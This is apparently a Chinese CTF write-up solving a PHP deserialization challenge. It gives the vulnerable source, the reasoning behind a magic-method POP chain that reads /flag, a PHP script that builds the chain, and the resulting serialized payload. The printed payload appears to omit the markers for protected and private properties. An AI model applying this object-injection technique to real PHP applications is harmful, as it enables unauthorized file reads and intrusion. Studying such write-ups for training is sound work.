



![img](https://peekaboo.show/content/images/2022/11/69bce6f54be45fc4d219573e1e0a54d5.png)



# Week2 UnserializeOne 200

#### 0、知识点与工具

>   php 魔术方法‌
>   ‌     __destruct()、__isset()、__construct()、__toString、                ‌
>   ‌     __invoke()、__call()、__clone()

>   php 反序列化

>   工具：burpsuite、postman

#### 1、分析一下代码

‌

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274


class Start{
    public $name;
    protected $func;
	
    // 函数销毁时执行
    // Start类对象销毁时执行
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

	// 当对不可访问属性调用isset()时调用
    // 访问Start类对象中不存在的属性时调用
    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

	// 类被当成字符串时调用
    // Sec类被当成字符串ecco时调用
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

	// 调用函数的方式调用一个对象时的回应方法
    // 调用Sec类对象中的一个方法时调用
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

	// 在对象中调用一个不可访问方法时调用
    // 调用Easy类对象中的一个不存在的方法时调用
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

	// 当对象复制完成时调用
    // 当eeee类对象被复制时调用
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```



‌

>   根据上面的分析，可以倒推，获取flag的invoke方法是在Sec类中，那么要触发invoke方法需要调用Sec类中的方法，

>   洞观全局只有Start类中有调用对象中的方法代码，

>   所以Start类中的属性func的值应该存储Sec类对象

>   然后想要执行Start类中isset方法，那么需要eeee类中的属性obj存储Start类对象

>   然后想要执行eeee类中clone方法，那么需要访问Easy类中一个不存在的方法

>   然后想要执行call方法，那么需要执行Sec类中的toString方法

>   然后想要执行toString方法，那么需要Start类对象被销毁

>   最终结果为：Start类对象中 $name= Sec类对象，$func = Sec类对象‌
>   ‌      Sec类对象中的 $obj = Easy类对象，$var = eeee类对象‌
>   ‌      eeee类对象中的$obj = Start类对象‌
>   ‌      Easy类对象中的$cla = null

>   把下面的代码加在题目中的最后一行，用自己的php环境跑一下就阔以得到下序列化的字符串，不过需要把最后那个if判断参数的代码干掉

‌

```php
$start = new Start();
$e = new eeee();
$easy = new Easy();

// 存储Start类对象就阔以触发其中的__isset魔术方法
$e ->obj = $start;

// 这里使用构成方法赋值，虽然原题没有但可以自己加
//$sec = new Sec($easy,$start);

// 没有构成方法方式赋值
$sec = new Sec();
// 存储Easy类对象就阔以触发其中的__call魔术方法
$sec ->obj = $easy;
// 存储eeee类对象就阔以触发其中的__clone魔术方法
$sec ->var = $e;

// 存储Sec类对象就阔以触发其中的__toString魔术方法
$start->name = $sec;
// 存储Sec类对象就阔以触发其中的____invoke魔术方法,获取flag
$start->func = $sec;

echo serialize($start);
```



‌

>   序列化后的字符串为

‌

```
O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";r:1;}}s:4:"func";r:2;}
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/288eb89fd17c95cb638cbdf7b5eb76c.jpg)



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/f4c037fd9ef9d16049e29e28eb6340f.jpg)



‌

>   看了有些人的wp，发现序列化的字符串需要url编码，但使用burp倒是并不需要url编码，编不编码并不影响结果，在这一题中

>   使用postman进行测试，发现url编码后的字符串还不能获得flag，未编码的字符串倒是可以获得flag

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117123944.png)



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117124029.png)



‌